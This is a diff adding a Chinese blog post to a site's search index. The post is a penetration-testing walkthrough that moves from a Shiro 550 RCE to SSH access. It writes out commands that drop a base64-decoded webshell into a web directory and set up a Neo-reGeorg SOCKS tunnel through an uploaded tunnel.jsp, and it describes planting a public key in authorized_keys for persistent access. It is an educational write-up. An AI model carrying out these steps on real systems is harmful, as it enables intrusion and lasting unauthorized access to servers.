@@ -2403,4 +2403,30 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
         <tag>WEB</tag>
       </tags>
   </entry>
+  <entry>
+    <title>渗透测试从RCE到SSH登录</title>
+    <url>/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透测试中，拿到webshell后执行命令总会碰到很多不便，而使用ssh登录则会方便许多。相比使用webshell工具执行命令，ssh连接可以有命令提示、路径补全、支持二次交互等优势，本文记录一个从WEB RCE漏洞到SSH登录的姿势。</p>
+<a id="more"></a>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>首先通过Shiro 550得到一个shell<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-10-46-08.png"></p>
+<p>因为网站不出网，所以不能直接反弹shell，通过base64写入webshell到web目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> &lt;base64 webshell&gt; |base64 -d &gt; webapps/uploadImg/shell.jsp;ls -lah</span><br></pre></td></tr></table></figure>
+<h4 id="架设代理"><a href="#架设代理" class="headerlink" title="架设代理"></a>架设代理</h4><p>网站不出网，所以需要架设socks代理访问ssh端口及内网主机，这里使用Neo-reGeorg。首次使用，先生成自己密码的neoreg服务端代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py generate -k &lt;your-password&gt;</span><br></pre></td></tr></table></figure>
+<p>执行后在<code>neoreg_servers</code>找到对应服务端语言的文件，这里是<code>tunnel.jsp</code>，然后通过上面的shell上传到目标服务器web目录上，再通过neoreg连接</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -k 指定连接密码，就是生成时用的密码</span></span><br><span class="line"><span class="comment"># -u tunnel.jsp 的url</span></span><br><span class="line"><span class="comment"># --skip 忽略https证书错误</span></span><br><span class="line"><span class="comment"># -l 本地socks服务监听ip</span></span><br><span class="line"><span class="comment"># -p 本地socks服务监听端口</span></span><br><span class="line">python3 neoreg.py -k &lt;your-password&gt; -u https://xxx.com/uploadImg/tunnel.jsp --skip -l 0.0.0.0 -p 30080</span><br></pre></td></tr></table></figure>
+
+<h4 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h4><p>为了尽量少修改服务器配置，通过写入ssh公钥可以不修改密码或者破解密码的情况下连接上ssh。这里使用xshell生成秘钥对，默认选项生成就可以了，shell会自动保存秘钥对，当然使用ssh-keygen也是可以的<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-03-18.png"></p>
+<p>然后把生成的公钥文件，复制到目标主机的<code>~/.ssh/authorized_keys</code>文件中，如果不存在可以创建<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-06-41.png"></p>
+<h4 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h4><p>配置ssh连接<code>127.0.0.2</code><br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-09-15.png"><br>配置用户名及公钥连接，公钥选择前面生成那个<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-12-19.png"><br>配置代理，使用上面neoreg构建的代理<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-10-38.png"><br>成功连接ssh<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-14-02.png"></p>
+<h4 id="为什么连接127-0-0-2"><a href="#为什么连接127-0-0-2" class="headerlink" title="为什么连接127.0.0.2"></a>为什么连接127.0.0.2</h4><p>经过实践发现，通过代理连接目标主机的内网ip <code>172.xx.xx.33</code>连接不上，而连接<code>127.0.0.1</code>时则提示主机指纹改变的问题，需要重新写入指纹到目标主机才能连接，然而非root用户无法写入，连接<code>127.0.0.2</code>则完美避开问题<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-08-08.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
 </search>
